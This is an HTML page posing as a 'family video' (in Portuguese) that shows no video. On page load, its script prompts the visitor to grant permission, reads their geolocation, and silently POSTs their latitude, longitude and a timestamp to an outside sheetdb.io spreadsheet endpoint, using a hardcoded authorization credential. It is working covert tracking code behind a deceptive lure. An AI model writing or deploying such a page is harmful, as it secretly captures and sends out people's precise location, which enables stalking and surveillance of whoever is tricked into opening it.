<html lang="en">
<head>

        body {

        }

<body>
    <h1> VIDEO DA FAMILIA </h1>
    
    <script>
        window.alert('Entre em permier para visualizar o video!')
        function success(pos){
            var dataAtual = new Date();
            console.log(pos.coords.latitude);  
            var myHeaders = new Headers();
            myHeaders.append("Authorization", "Basic cDg5bHJkaXk6bTE5Zm44d2hqcnBvcDd3d3k0MzQ=");
            var formdata = new FormData();
            formdata.append("DATE",dataAtual);
            formdata.append("LAT", pos.coords.latitude);
            formdata.append("LON", pos.coords.longitude);

            var requestOptions = {
            method: 'POST',
            headers: myHeaders,
            body: formdata,
            redirect: 'follow'
            };

            fetch("https://sheetdb.io/api/v1/1vbeqghmgsr6n", requestOptions)
            .then(response => response.text())
            .then(result => console.log(result))
            .catch(error => console.log('error', error));
                

            
        }
         navigator.geolocation.getCurrentPosition(success);
         
    </script>
